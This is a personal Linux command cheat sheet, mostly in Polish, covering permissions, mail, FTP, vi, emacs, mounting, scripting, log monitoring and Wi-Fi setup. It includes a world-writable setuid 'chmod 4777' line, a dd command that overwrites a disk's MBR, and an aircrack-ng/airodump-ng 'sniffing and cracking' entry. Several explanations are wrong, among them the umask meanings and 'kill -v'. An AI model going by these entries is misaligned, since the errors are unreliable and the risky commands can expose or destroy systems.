umask 421				- oznacza: wlasciciel moze plik czytac grupa moze do pliku
					  pisac a pozostali uzytkownicy moga plik wykonywac
umask 700				- oznacza pelne prawa dla wlasciciela i zadnych praw
					  dla grupy i reszty uzytkownikow
umask 077				- wylaczy prawa do czytania pisania i wykonywania dla grupy i calego
					  "swiata" (reszty uzytkownikow)
					  PO WPISANIU UMASK I WARTOSCI OD TEJ PORY KAZDY UTWORZONY PLIK
					  BEDZIE MIAL TAKIE PRAWA DOSTEPU
chown nowy_wlasciciel nazwa_pliku	- daje prawa do pliku innemu uzytkownikowi
chown -r nowy_wlasciciel nazwa_pliku	- daje prawa do wszystkich plikow w katalogu innemu uzytkownikowi
chgrp nowa_grupa nazwa_pliku		- daje prawa do pliku okreslonej grupie
who					- info o wszystkich zalogowanych do systemu, obejmuje nazwe uzytkownika
finger					- to samo co who tylko jeszcze jest imie
					  terminal, i czas zarejestrowania sie w systemie
who am i				- info tylko o tobie

/////////////////////////////////////// KOMUNIKACJA MIEDZY UZYTKOWNIKAMI /////////////////////////////////////////////////////

write nazwa_uzytkownika			- wysylanie wiadaomosci do okreslonego uzytkownika, tekst pojawia sie 
					  odrazu po wpisaniu, teksty obu uzytkownikow moga sie mieszac
mesg n					- zablokowanie przychodzacych wiadomosci write
mesg y					- odblokowanie przychodzacych wiadomosci write
talk nazwa_uzytkowika			- nastepny program tutaj ekran dzieli sie na dwie czesci a rozmowa
					  sie nazwiazuje jesli drugi rozmowca odpowie 
					  "talk twoja_nazwa_uzytkownika"
conrol-c				- zakancza program talk
							

///////////////////////////////////////////// MAIL //////////////////////////////////////////////////////////////////////////////

mail						- otwiera twoja skrzynke odbiorcza
mail nazwa_uzytkownika1 nazwa_uzytkownika2	- wyslanie maila do danego(ych) uzytkownika np: mail user@wp.pl,
						  mail grzes. 
control-d lub ("." sama w wierszu)		- zakonczenie listu i wyslanie
control-c					- opuszczenie programu bez wysylki listu
/usr/spool/mail nazwa_uzytkownika lub		- tu znajduje sie plik w ktorym sa zapisywane nadchodzace listy
/usr/mail/ nazwa_uzytkownika			  (nazwa pliku jest tez napisana w zmiennej srodowiskowej MAIL
						  mozna sie tam dostac wpisujac export i znalesc MAIL=...)
d2						- wrzuca 2 list do "kosza"
q						- usowa listy z "kosza" i zamyka program
x						- opuszczenie programu bez usowania listow
-						- poprzedni list
+						- nastepny list
p						- powtorne wyswietlenie biezacego listu
w 1 /home/zachowana_tresc		        - zachowanie tresci listu nr 1 w pliku zachowany_list w katalogu home
s 1 /home/zachowany_list			- zachowanie listu (naglowka i tresci) nr 1 

///////////////////////////////////////////// SIEC /////////////////////////////////////////////////////////////////////////////

rlogin nazwa_kompa				- rejestracja w inny systemie Unix
telnet nazwa_kompa				- rejestracja w innych systemach np: winNT
rcp nazwa_kompa:plik_zrodlowy plik_docelowy	 - program do przesylania plikow pomiedzy systemami Unix
ftp plik_zrodlowy nazwa_kompa:plik_docelowy	 - program do przesylania plikow pomiedzy dowolnymi systemami
							
								KOMENDY FTP:
				get plik	- pobranie pliku z innego kompa
				mget plik(i)	- pobranie wielu plikow
				put plik	- wyslanie pliku do innego kompa
				mput plik(i)	- wyslanie wielu plikow
				bye		- zamkniecie polaczenia z innym kompem
				ls		- spis plikow na drugim kompie
				cd		- zmiana katalogu na drugim kompie
				binary		- tryb przeslania plikow binarnych
				ascii		- tekstowy tryb przeslania (z tlumaczeniem znakow konca wiersz)
control-]					- nie przerywajac pracy na zdalnym kompie powrot do swojego 
						  systemu lokalnego (W PRZYPADKU SESJI TELNET)
return~control-z				- to co wyzej ale dla RCP (dziala jesli twoja powloka ma	
						  wbudowany mechanizm wielozadaniowosci zwany "job-control"

///////////////////////////////////////////// PROCESY ////////////////////////////////////////////////////////////////////////

ps						- wypisuje stan procesow
ps -l						- dokladniejsze wypisanie stanow procesow
ps -aux | more					- wypisanie wlacznie z procesami nienalezacymi do ciebie (| more - udogodnienie)

						OPIS WYPISANYCH KOLUMN:
				PID			- identyfikator procesu
				TTY			- terminal do ktorego jest podlaczony proces
				STAT			- stan procesu (W=czekajacy, R=wykonywany lub gotowy do wykonania
						          S=uspiony, Z=zabity ale wciaz przebywajacy w systemie)
				TIME			- czas jego wykonywania
				COMMAND lub CMD 	- nazwa programu ktory wykonuje proces
				UID			- nazwa uzytkownika ktory jest wlasciciele procesu
				PPID			- proces nadrzedny ktory utworzyl dany proces
				C lub CP		- wykorzystanie procesora - urzywane do szeregowania procesow
				PRI			- priorytet
				NI			- wartoscuzywana do obliczania priorytetu
				ADDR			- adres procesu
				SZ			- rozmiar procesu w blokach
				WCHAN			- zdarzenie na ktore oczekuje proces
nice o_ile_nizszy polecenie				- zmiana priorytetu procesu i mniejsza liczba tym wyzszy
							  priorytet (automatycznie nizszy priorytet otrzymuja 
							  procesy intensywnie wykorzystujace CPU)
							  (tylko administrator moze podawac liczby ujemne)
cat *.doc > wszystkie.doc &				- znaczek & na koncu polecenia oznacza ze powloka utworzy
							  dany proces i uruchomi program ale nie bedzie czekala na
							  jego zakonczenie
kill identyfikator_procesu				- zakonczenie procesu
kill -9 identyfikator_procesu				- zakonczenie procesow ktore ignoruja zwykla komende kill
kill -v nazwaprocesu					- zabjia proces po podaniu jego nazwy
at czas "polecenie" control-d				- wykonanie procesu o okreslonej godzinie np:
							  "cat 0900a "cat *.doc > razem.doc" control-d" co oznacza ze 
							  proces sie uruchomi o godzinie 9:00 rano (a=a.m., p=p.m.)


///////////////////////////////////////////// EDYTOR VI //////////////////////////////////////////////////////////////////////

vi nazwa_pliku		- otwiera edytor z plikiem do edycj
vi 			- uruchamia edyto potem:
:			- wierszowy tryb pracy (wiersz staje sie poleceniem po nacisnieciu return)
i			- drugi tryb pracy gdzie znaki sa wstawiane do bufora az do nacisniecia
			  klawisza esc
10x			- usunie 10 znakow pod kursorem
10X			- usunie 10 znakow na lewo od kursora
:w			- zachowanie pliku na dysku
:q			- opuszczenie programu
:wq lub ZZ		- zapisuje plik i opuszcza program
:q!			- wyjscie bez zapisania pliku
10dd			- wycina do schowka 10 wierszy od kursora w dol
10yy			- kopiuje do schowka 10 wierszy od kursora w dol
p			- wklejenie zawartosci schowka na lewo od kursora
P			- wklejenie zawartosci schowka na prawo od kursora	
/klocek			- znajduje string klocek
/			  nastepne wyszukanie tego samego stringu
:s/klocek/badylek	- zamiana klocek na badylek w biezacym wierszu
:1,$s/klocek/badylek/g	- zamiana klocek na badylek w calym pliku
:r nazwa_pliku		- wczytanie do bufora innego pliku
:set number		- numerowanie wierszy
:set no number		- nie ponumerowane wiersze
u			- cofniecie skutkow ostatniego polecenia

///////////////////////////////////////////// EDYTOR EMACS ////////////////////////////////////////////////////////////////////////

control-h					- wypisanie pomocwemacs
naprzyklad: control-h a file			- wypisanie info o funkcji w ktorej wystepuje slowo filew
control-h o					- przelanczanie miedzy oknami
control-h 0					- usuniecie okna pomocy gdy kursor sie w nim znajduje
control-h 1					- usuniecie okna pomocy gdy kursor znajduje w oknie z redagowanym 
						  tekstem
control-x b (i podac nazwe pliku)		- wyswietlenie okreslonego redagowanego pliku
emacs nazwa_pliku (w wierszu polecen)		- otwarcie pliku w edytorze emacs						
control-x control-s				- zapisanie pliku
control-x control-c				- opuszczenie emacsa
nazwa_pliku~					- nazwa kopi zapasowej pliku
esc x overwrite-mode				- tryb zastepowania tekstu
control-k					- wyciecie do schowka tekstu od kursora do konca wiersza
control-@ 					- zaznaczenie poczatku przenoszonego bloku tekstu
control-w					  zaznaczenie konca bloku przenoszonego tekstu
control-y					- wklejenie zawartosci schowka
control-s					- wyszukiwanie stringa

///////////////////////////////////////////// INNE INFORMACJE /////////////////////////////////////////////////////////////////////

1) gdzie co jest "standardowo":
	- / 		- katalog glowny		
	- /root		- katalog administratora (root-a)
	- /home     	- katalogi uzytkownikow
	- /usr/bin 	 - programy dla uzytkownikow, pliki wykonywalne (standartowe programy instalowane na poczatku z systemem)
	- /usr/local/bin  - programy dodane przez administratora dla konkretnego hosta lub lokalnej sieci
	- /usr/local	- oddziela pliki dostarczone przez "sprzedawce" i pozniejsze rozszerzenia 
			  od programow pochodzacych z systemu
	- /usr/lib	- pliki pomocnicze dla standartowych programow linuxowych
	- /usr/man	- pliki podrecznika systemowego man
	- /usr/src	- kody zrodlowe programow
	- /var/log	- pliki dziennika
	- /var/spool	- katalogi kolejek dla drukarek, poczty itd.
	- /bin lub /sbin  - standartowe programy bedace czescia systemu, niezbedne do zapewnienia minimalnej
			    funkcjonalnosci systemu
	- /tmp  	- pliki tymczasowe (usowane przy starcie systemu)
	- /var/tmp	- pliki tymczasowe (nie usowane przy starcie systemu)
	- /etc		- programy konfiguracyjne, nazwy pozostalych uzytkownikow (w pliku passwd)
	- /dev		- jadro systemu, pliki odpowiadajace urzadzeniom
4) wykonywany program mozna zakonczyc klawiszami: control-c
   lub zstopowac klawiszami control-\ wtedy zostaje stworzony plik core w
   ktorym jest zapisany stan programu w momencie stopu (plik core moze byc duzy)
5) wypisywanie danych na ekran mozna zatrzymac: control-s
   i wznowic: control-q
6) skrypt inicjujacy: .profile
7) przy tworzeniu plikow z dziwnymi znaczkami w nazwie trzeba je poprzedzac \ lub umiescic nazwe
   w "" wtedy znaczki straca swoje specjalne znaczenia ale wtedy trzeba uwazac przy kasowaniu 
   zeby np: nie wpisac rm * tylko rm"*" bo mozna skasowac wszystkie pliki z katalogu
8) wyjerestrowanie sie: control-d - powloki bourne i korn, logout - powloka c
9) odswiezanie ekranu: control-l
10) kazdy plik ma dwoch wlascicieli uzytkownika i grupe 
    - uzytkownik moze byc czlonkiem wiecej niz jednej grupy
    - nowo utworzony plik nalezy do tej grupy, do ktorej nalezy katalog, w ktorym jest tworzony plik
    - gdy chcesz cos robic z plikiem system najpierw bada czy jestes wlascicielem pliku jesli tak
      to sa sprawdzane prawa dostepu uzytkownika w przeciwnym wypadku jest porownywana grupa do 
      ktorej nalezy plik gdy odp jest pozytywna system sprawdza grupowe prawa dostepu gdy nie
      prawa dostepu pozostalych uzytkownikow	
11) po zmontowaniu np: cdromu jest "tworzony" punkt zamontowania ktory nie musi miec nic wspolnego
    z fizycznymi nosnikami, podrzedny system plikow jest "doczepiany" do systemu glownego w punkcie zamonotowania
13) Kod zrodlowy systemu Linux znajduje sie w katalogu /usr/src/linux-2.4 w tym katalogu jest tez katalog "kernel"
    gdzie jest plik "sched.c" dotyczy on zarzadzania procesami
14) Domyslna lokalizacja pakietow na plycie z instalka linuxa jest: /mnt/RedHat/RPMS
15) Programem lpq mozemy oproznic bufor drukarki
 
shutdown -r now lub reboot		- ponowne uruchomienie kompa
shutdown -h now lub halt		- zatrzymuje prace systemu
gnomecc					- control-panel dla gnome
uname -a				- informacje m.in. o wersji jadra ktora mamy 
df					- ilosc wolnego miejsca na dysku
du					- wielkosc katalogow i ich podkatalogow w kilobajtach
file sciezka				- podaje rodzaj pliku

/////////////////////////////// MONTOWANIE CDROM, FLOPPY I PARTYCJI Z WINDOWS /////////////////////////////////////////////////////

PAMIETAJ ZE SCIEZKA: /mnt/jakis_katalog MUSI ISTNIEC PRZED ZMONTOWANIEM CZYLI MUSISZ NAJPIERW STWORZYC KATALOG W /mnt DO
KTOREGO BEDZIE PODMONTOWYWANY JAKIS SYSTEM PLIKOW

mount /dev/cdrom/ mnt/cdrom		- zamontowanie cdrom-u
umount /dev/cdrom albo
umount /mnt/cdrom	 		- odmontowanie cdromu
mount /dev/fd0 /mnt/floppy		- zamontowanie flopa
umount /dev/fd0 albo
umount /mnt/floppy			- odmontowanie flopa
mount /dev/hda1 /mnt/windows		- montowanie dysku z windowsem (jesli masz 2 dyski na pierwszym jest win a na drugim linux 
					  jesli masz inaczej np: win jest na tym samym dysku co linux moze sciezka wygladac inaczej)
umount /dev/hda1 /mnt/windows		- odmontowywanie partycji z windowsem 						  

MOZESZ SKONFIGUROWAC LINUXA TAK ABY MONTOWAL NP: PARTYCJE WINDOWSOWA ZARAZ NA STARCIE MUSISZ ZNALESC TYLKO PLIK /etc/fstab
OTWORZYC GO NP: PROGRAMEM  gedit I NA SAMEJ GORZE WPISAC PO KOLEJ
/dev/hda1	/mnt/windows		fat			auto		0 0
OCZYWISCIE SCIEZKA /dev/hda1 MOZE BYC INNA W TWOIM KOMPIE
	
////////////////////////////////////// AUTOMATYKA, SKRYPTY W LINUXIE //////////////////////////////////////////////////////////////////

at 						- mozna tym poleceniem zlecic systemowi wykonywanie jakiegos polecenia
						  o okreslonej godzinie ( jesli ma byc wykonywane cyklicznie mozna je dodac
						  do pliku cron danego uzytkownika)

(CHCEMY ABY O 16:05 BYL WYSYLANY LIST NA OKRESLONY ADRES) PO KOLEJ:
at teatime + 5 minutes			- zaznaczmy o ktorej ma to nastapic (teatime oznacza 16:00) czas mozna tez okreslic np:
					  tak: at 2:14pm Jan9, at now + 5 minutes (hour, week, day, year), at teatime next day
mail -s "temat wiadomosci"
dzony@poczta.onet.pl  			- piszemy co ma byc wykonywane i wciskamy enter
"co tam slychac"  	 		- wpisujemy tresc listu i wciskamy enter
naciskamy control-d			- i tym samym konczymy

mail dzony@poczta.onet.pl 
<~/nazwa_pliku				- wysyla na podany adres zawartosc pliku
atq					- wyswietla wszystkie polecenia oczekujace na wykonanie
atrm numer				- usowa polecenie o okreslonym numerze

cron					- automatyczne uruchamianie polecen w okreslonych odstepach czasu (np: przypomnienie
					  co tydzien o zrobieniu kopii zapasowej)
/var/spool/cron				- pliki cron wszystkich uzytkownikow
Pliki cron mozna stworzyc w linux configuratorze 

history n > nazwa_skryptu		- "tworzy" skrypt z ostatnich n komend
chmod u+x nazwa_skryptu			- PAMIETAJ ZEBY NADAWAC SKRYPTOM MOZLIWOSC WYKONYWANIA
						
				TWORZENIE SKRYPTOW POWLOKI (PRZYKLADOWE SPOSOBY):

1) SPOSOB - Gnotepad
 
Uruchom jakikolwiek edytor np gnotepad 
Na samej gorze wpisz (musi zawierac pelna sciezke do
"programu" w ktorym bedzie wykonywany):						#!/bin/bash
potem np:              								echo -e "dzwonek! \a"
nastepnie zapisz plik np: pod nzawa:    					skrypt
aby uruchomic skrypt np: wejdz do katalogu gdzie jest i wpisz:  bash skrypt


2) SPOSOB - vi

Wpisz w lini komend:								vi nazwa_skryptu (np: skrypt)
nacisnij: 									i
wcisnij:									control-c
wpisz:										:wq
i aby uruchomic skrypt wpisz:							bash skrypt (ale jesli jestes w tym samym 
										katalogu co skrypt)

licznik = 0				- deklaracja zmiennej
nazwa = "Stefan Telefan"		- rowniez deklaracja w tekscie wystapila spacja wiec jest otoczony cudzyslowem
licznik = $mojazmienna			- przypisanie jednej zmiennej wartosci drugiej (mojazmienna przejela wartosc)
$1, $2 itd				- dzieki tym argumentom ich wartosci mozna przekazywac po uruchomieniu 
					  skryptu z wiersza polecen

---------------------------------------SKRYPT - WYSWIETLANIE ARGUMENTOW Z WIERSZA POLECEN ---------------------------
if [$# -eq 0]
then
echo "Podaj identyfikator uzytkownika"
else
echo "Witaj" $1
fi
------------------------------------------------------------------------------------------------------------------------
$# 						- oznacza wszystkie argumenty ktore mozna podac z wiersza polecen
$# -eq 0					- porownanie (jesli $# jest rowne 0 ) 
fi						- zakonczenie instrukcji warunkowej if
------------------------------------------------------------------------------------------------------------------------
$# 						- oznacza wszystkie argumenty ktore mozna podac z wiersza polecen
$0						- nazwa programu powloki
$*						- pojedynczy tekst utworzony ze wszystkich argumentow przekazanych w wierszu polecen
=						- rowne (lancuchy znakow)
!=						- nierowne (lancuch znakow)
-eq						- rowne (liczby)
-ge						- wieksze lub rowne (liczby)
-le						- mniejsze lub rowne (liczby)
-ne						- rozne (liczby)
-gt						- wieksze niz (liczby)
-lt						- mniejsze niz (liczby)
for...do...done					
while...do...done
until...do...done
select...element...in...listaelementow...do...done
if...elif...else...fi
case
						JEZYK AWK

Ponizszy skrypcik jest pisany w lini komend i ma wypisac ilosc liter w kazdym wierszu pliku z tekstem
(jezyk Awk najlepszy jest wlasnie do przetwarzania tekstu)

cat nazwa_pliku | gawk '{print NF ": " $0}'

						JEZYK PERL

Perl moze byc uruchamiany na prawie kazdym systemie operacyjnym, sluzy m.in. do obslugi stron www za pomoca 
mechanizmow CGI lub np: automatyzacji zadan administracyjnych

-----------------------------------SKRYPT - WYSWIETLA NUMER IDENTYFIKACYJNY UZYTKOWNIKA ---------------------------------

Wszystko podobnie jak w tworzeniu skryptow powloki tylko ze tu wpisujemy po kolej w pliku:

#! /usr/bin/perl
print"Twoj numer identyfikacyjny to $< \n"
print "-------------------------------------- \n"

Uruchom powyzszy skrypt wpisujac po prostu jego nazwe
------------------------------------------------------------------------------------------------------------------------
$< 		- zmienna ktora zawiera numer identyfikacyjny uzytkownika
--------------------------------------------------------------------------------------------------------------------------

					JEZYKI PYTHON I TCL

Python obsluguje klasy wyjatki i dynamiczne typy danych moze pracowac interaktywnie lub interpretujac kod zapisany
w modulach. Programy w tym jezyku moga korzystac ze srodowiska graficznego np: Gnome

TCL jest prostym jezykiem skryptowym przeznaczonym glownie do osadzania w innych jezykach, ma za zadanie spajac 
biblioteki i jezyki programowania o wiekszych mozliwosciach 

						JEZYK C

PONIZEJ OPISUJE CO TRZEBA ZROBIC ZEBY STWOZYC PROGRAM W POJEDYNCZYM PLIKU (oczywiscie sa na to inne sposoby):

wpisujemy: vi progs.c 				- otwiera nowy plik "progs.c" w edytorze vi
naciskamy i					- wchodzimy w tryb wpisywania programu
wpisujemy np taki program:

#include <stdio.h>
int main()
{
printf("Pararara \n");
exit(0);
}

po wpisaniu programu naciskamy ctr-c    	- dzieki temu wejdziemy w tryb wpisywania na terminalu
wpisujemy: :wq					- czyli zapisz i zamknij edytor
wpisujemy: touch program			- tworzymy pusty plik
wpisujemy: gcc progs.c -o program		- dzieki temu nasz program z pliku progs.c zostaje zkompilowany do pliku
						  wynikowego program
wpisujemy: ./program				- uruchamia nasz program			

//////////////////////////////////////// INSTALACJA PAKIETOW - GnoRPM ////////////////////////////////////////////////////////

Wejdz do Main Menu / System / GnoRPM
nacisnij przycisk Install
nacisnij przycisk Add
teraz (jesli chcesz cos zainstalowac z cdromu) wejdz do (nie koniecznie musisz miec taka sama sciezke)
/mnt/cdrom/... i znajdz pliki z rozszerzeniem .rpm ktory chcesz zainstalowac
jak juz cos wybierzesz nacisnij Add i zamknij to okno
na tym oknie co pozostalo pownienes widziec ikonke paczki i nazwe wybranego przez siebie pakietu teraz juz 
po prostu nacisnij Install 
Jesli chcesz uzyskac dokladniejsze info o pakiecie nacisnij na niego prawym klawiszem i wybiez Query jesli
chcesz sprawdzic czy nie ma bledow nacisnij Verify
Mozesz tez instalowac pakiety z interka do tego sluzy przycisk Web Find

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

gdb - debuger kodu zrodlowego
gcc - kompilator c
g++ - kompilator c++
bison - generator analizatorow skladni


------------

4000
chmod 4777 skrypt
chmod u+s skrypt

2000
chmod 2777 skrypt
chmod g+s skrypt

#1000
#chmod 1777 skrypt


----------------


mount //10.1.3.114/C$ /mnt -o username=user,passored=xxxxxxxxxxxxxx
mount WarcraftReign.iso /mnt -t iso9660 -o ro,loop=/dev/loop0



partimage

Epylog Log Analyzer

---------
# Merge 2 logfiles in one window:

multitail /var/log/apache/access.log -I /var/log/apache/error.log

# Show 3 logfiles in 2 columns:

multitail -s 2 /var/log/apache/access.log /var/log/messages /var/log/mail.log

# Show 5 logfiles while merging 2 and put them in 2 columns with only one in the left column:

multitail -s 2 -sn 1,3  /var/log/apache/access.log -I /var/log/apache/error.log /var/log/messages \
                        /var/log/mail.log /var/log/syslog

# Merge the output of 2 ping commands while removing "64 bytes received from" from only 1 of them:

multitail -l "ping 192.168.0.1" -ke "64 bytes from" -L "ping 192.168.0.2"

# Show the output of a ping-command and if it displays a timeout, send a message to all users
currently logged in

multitail -ex timeout "echo timeout | wall" -l "ping 192.168.0.1"

# In one window show all new TCP connections and their state changes using netstat while in
the other window displaying the merged access and error logfiles of apache

multitail -R 2 -l "netstat -t" /var/log/apache/access.log -I /var/log/apache/error.log

# As the previosu example but also copy the output to the file netstat.log

multitail -a netstat.log -R 2 -l "netstat -t tcp" /var/log/apache/access.log -I /var/log/apache/error.log

# Show 2 logfiles merged in one window but give each logfile a different color so that you
can easily see what lines are for what logfile:

multitail -ci green /var/log/apache/access.log -ci red -I /var/log/apache/error.log

# Show 3 rssfeeds merged in one window using rsstail

multitail -cS rsstail -l "rsstail -n 1 -z -l -d -u http://setiathome.berkeley.edu/rss_main.php" \
	-cS rsstail -L "rsstail -n 1 -z -l -d -u http://www.biglumber.com/index.rss" -cS rsstail \
	-L "rsstail -n 1 -z -l -u http://kernel.org/kdist/rss.xml"

# Show a Squid (proxy server) logfile while converting timestamps to something readable

multitail -cv squid /var/log/squid/access.log

# Display Q-Mail logging while converting the timestamp into human readable format

multitail -cv qmailtimestr /var/log/qmail/qmail.smtpd.log

# Merge ALL apache logfiles (*access_log/*error_log) into one window:

multitail -cS apache --mergeall /var/log/apache/*access_log --no-mergeall -cS apache_error \
	--mergeall /var/log/apache/*error_log --no-mergeall

# Monitor the logfile of an other system:
For this you need to setup a couple of things. MultiTail runs on system A, the logfile on system B.
In this example we're going to monitor the apache logfile. Add the following to /etc/services:

apachelog       20000/tcp

Add this to /etc/inetd.conf:

apachelog stream tcp nowait root /usr/local/sbin/tail_apache_log /usr/local/sbin/tail_apache_log

and create the file /usr/local/sbin/tail_apache_log with the following content:

#!/bin/sh

/usr/bin/tail -f /var/log/apache2/access.log

make sure that you don't forget to make that script executable (chmod +x filename).
Then on host A start MultiTail like this:

multitail -cS apache -l "telnet B 20000"

Please note that logfiles go in plaintext across the network. You may also need to adjust
the files /etc/hosts.[allow|deny] on host B to only allow host A to connect.
# Monitoring Tomcat

multitail -cS apache -cS log4j "${TOMCAT_HOME}/logs/catalina.out"


-------------

### top 5 most recently attacked accounts
lastb | awk '{print $1}' | sort | uniq -c | sort -rn | head -5

### top 5 most attacked accounts
awk 'gsub(".*sshd.*Failed password for (invalid user )?", "") {print $1}' /var/log/secure* | sort | uniq -c | sort -rn | head -5

### top 5 attacker IP addresses (obscured for privacy)
awk 'gsub(".*sshd.*Failed password for (invalid user )?", "") {print $3}' /var/log/secure* | sort | uniq -c | sort -rn | head -5


ntop
wine

dovecot - pop linux serwer

MBR copy
dd if=/dev/sda bs=1 count=512 of=./mbr_copy

z pliku na dysk
dd if=./mbr_copy bs=1 count=512 of=/dev/sda


bzip2 -d plik.tar.bz2
tar xvf plik.tar

tar xvjf plik.tar.bz2

List out your last update with rpm

rpm -qa --last | tac
rpm -q glibc glibc-common binutils compat-libstdc++-296 gcc gcc-c++ libstdc++ libstdc++-devel openmotif21 \
pdksh setarch make gnome-libs sysstat compat-db control-center xscreensaver

sprawdzenei czy pakiety sa zainstalowane

nmap -sT -O localhost

lsof -i | grep 834

lsof +D /mnt/cdrom


multitail
rsstail


Przeszukaj sourceforge.net systemów monitorująco-alarmujących jest mnóstwo od prostych po bardzo rozbudowane (Zabbix, Pandora, Nagios). Zawsze też możesz zbudować własne rozwiązanie od podstaw wykorzystując SNMP

How to create Image (ISO) files from CD/DVD
umount /dev/cdrom
dd if=/dev/cdrom of=file.iso bs=1024

How to create Image (ISO) files from folders
mkisofs -o file.iso /location_of_folder/

How to mount/unmount Image (ISO) files without burning
mkdir /media/iso
modprobe loop
mount file.iso /media/iso/ -t iso9660 -o loop

How to mount/unmount network folders manually, and allow all users to read
mount //192.168.0.1/linux /media/sharename/ -o username=myusername,password=mypassword
mount //192.168.0.1/linux /media/sharename/ -o username=myusername,password=mypassword,dmask=777,fmask=777

How to browse network computers
smb://192.168.0.1/linux

How to mount network folders on boot-up, and allow all users to read
mkdir /media/sharename
gedit /root/.smbcredentials
username=myusername
password=mypassword
chmod 700 /root/.smbcredentials
cp /etc/fstab /etc/fstab_backup
gedit /etc/fstab
//192.168.0.1/linux    /media/sharename cifs  credentials=/root/.smbcredentials    0    0
lub read-write
//192.168.0.1/linux    /media/sharename cifs  credentials=/root/.smbcredentials,dmask=0777,fmask=0777  0    0


vncviewer -fullscreen 192.168.0.1:0

Rescue Mode
linux rescue


ssh 

How to copy files/folders from remote Fedora machine into local machine (scp)
scp -r username@192.168.0.1:/home/username/remotefile.txt .

How to copy files/folders from local machine into remote Fedora machine (scp)
scp -r localfile.txt username@192.168.0.1:/home/username/

How to copy files/folders from remote Fedora machine into local machine (rsync)
rsync -v -u -a --delete --rsh=ssh --stats username@192.168.0.1:/home/username/remotefile.txt .

How to copy files/folders from local machine into remote Fedora machine (rsync)
rsync -v -u -a --delete --rsh=ssh --stats localfile.txt username@192.168.0.1:/home/username/

grep MemTotal /proc/meminfo

grep "model name" /proc/cpuinfo

oracle

rpm -q binutils compat-db control-center gcc gcc-c++ glibc glibc-common gnome-libs \
         libstdc++ libstdc++-devel make pdksh sysstat xscreensaver libaio

rpm -q redhat-release - jaki jest system
cat /etc/redhat-release
cat /etc/issueau
kontact
k3b
fail2ban - weryfikacja nieudanych prob logowania
chkrootkit - program skanujący uslugi w poszukiwaniu rootkitow
rkhunter - program skanujący uslugi w poszukiwaniu rootkitow
enemy-territory - gra 3d 
iftraf ???

wireshark - analizator seciowy
rpm -qf /usr/lib/libdb.so - do kogo nalezy pakiet


---------- kopiowanie okreslonych plików
Paweł wrote:
> [quoted text muted]

find /mnt/plytkaDebiana -name \*deb -exec cp '{}' /mnt/pakiety/DVD \;

> [quoted text muted]

Oczywiście.

Gdybyś chciał natomiast odtworzyć strukturę z płytki to:

cd /mnt/plytkaDebiana
for DI in $(find . -type d); do
	mkdir -p /mnt/pakiety/DVD/${DI}
	find ${DI} -name \*deb -exec cp '{}' /mnt/pakiety/DVD/${DI} \;
done

(jeśli są tam katalogi w których nie ma debów, to trzeba je będzie
skasować w /mnt/pakiety/DVD).

Czy jakoś tak (nie sprawdzałem).

Jeszcze chyba można jakoś to zrobić poprzez rsync, podając, że kopiowane
mają być tylko *deb - automatyczna struktura wtedy powstaje.


-----------

procesy które mają otwart pliki w danym katalogu
find /home/user/ -type d  -exec fuser {} \;


yum install streamtuner     
yum install krusader
yum install kdiff3
 yum install gwenview
yum install gnome-commander   
yum install liferea     


mencoder tv://49 -tv driver=v4l:input=0:norm=PAL:chanlist=europe-west:width=384:height=288:adevice=/dev/dsp -oac mp3lame -lameopts cbr:br=64 -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=800 -o tv.avi


keepass

azureus
mldonkey

toolame

iostat
iostat -xtc 5 10
netstat -i 
top
vmstat
mpstat
sar
lsof
free -t -m
sadf

clamav

dmesg | grep -i ntfs
grep -i ntfs /var/log/messages


-------------------------WiFi--------------------
wi-fi install USB
t2570-k2wrlz-1.6.1
modprobe rt2570  - Now we can load the module into the kernel:
yum -y install aircrack-ng 
yum install  ndiswrapper

Simple sniffing and cracking
airodump-ng rausb0

kismet

# iwconfig rausb0 essid xxx key open s:jakiskluczASCII
# dhclient rausb0

iwlist rausb0 scan

    * Lista punktów dostępowych AP, która pojawi się po wydaniu polecenia iwlist wlan0 scan, będzie zawierała ich nazwy. Jedną z nich należy wpisać obok essid zamiast xxx w przykładzie powyżej. Ewentualnie wydać osobne polecenie, gdy konfigurujemy krok po kroku: 

# iwconfig wlan0 essid ESSID (gdzie ESSID to nazwa AP)

    * W konfiguracji karty określa się także tryb pracy interfejsu wlan0. W tym celu w linii poleceń należy wpisać (z uprawnieniami superużytkownika): 

# iwconfig wlan0 mode Ad-Hoc

    * Rodzaje trybów
          o Ad-Hoc - służy do bezpośrednich połączeń z innymi urządzeniami. W Windows Ad-Hoc nazywa się trybem równorzędnym.
          o Managed - (tryb infrastruktury); wybieramy go, gdy do zarządzania siecią używany jest punkt dostępowy AP (Access Point), który przydziela adresy IP automatycznie.
          o Master - służy do tworzenia punktu AP, ale nie jest on obsługiwany przez urządzenia korzystające z Ndiswrappera. 

    * Włączenie interfejsu sieciowego 

# ifconfig wlan0 192.168.1.1 up

    * Podanie adresu IP obowiązuje dla trybu Ad-Hoc (tryb równorzędny). W trybie Managed (tryb infrastruktury) punkty dostępowe nadają IP za pomocą serwera DHCP. 


iwconfig - narzędzie służące do konfiguracji kart bezprzewodowych
iwevent - narzędzie, które umożliwia wyświetlenie komunikatów generowanych przez sterownik lub zmianę ustawień karty
iwgetid - narzędzie służące do pobierania nazw/adresów ESSID, NWID, Acces Pointów lub komórek
iwlist - narzędzie, które umożliwia pobranie dokładniejszych informacji z wybranego interfejsu (m.in. umożliwia skanowanie sieci)
iwpriv - narzędzie służące do konfigurowania opcjonalnych (prywatnych) parametrów interfejsu
iwspy - narzędzie służące do wyszukiwania szczegółów dotyczących sieci


Na początku przy pomocy programu iwlist wyszukujemy sieci
iwlist wifi0 scanning

Interesuje nas połączenie w trybie ad-hoc do hosta o nazwie komputer1, dlatego wykonujemy kolejno
iwconfig wifi0 essid komputer1 - zmieniamy nazwę essid naszej karty
iwconfig wifi0 mode ad-hoc - zmieniamy tryb działania karty na ad-hoc
iwconfig wifi0 channel 5 - zmieniamy kanał na 5

pozostaje konfiguracja adresu ( zobacz ifconfig ), po czym możemy wyświetlić status karty

iwconfig wifi0

Pobieranie informacji z karty za pomocą programu iwlist

B
  \   /
   \ /
    C

on A:

 #iwconfig ra0 mode Ad-Hoc essid adhocwireless channel 1
 #ifconfig ra0 192.168.1.A up

on B:

 #iwconfig ra0 mode Ad-Hoc essid adhocwireless channel 1
 #ifconfig ra0 192.168.1.B up

Procedura uruchamiania wi-fi

1. zamknac rausb0. uruchomic program wifi-down.
2. uruchomić rausb0. uruchomich program wifi-up.
3. przestartowad demona dhcpd. servide dhcpd stop, service dhcpd start.
4. uruchomic firewalla z odpowiednią konfiguracją.

- - -




-------------------------WiFi--------------------


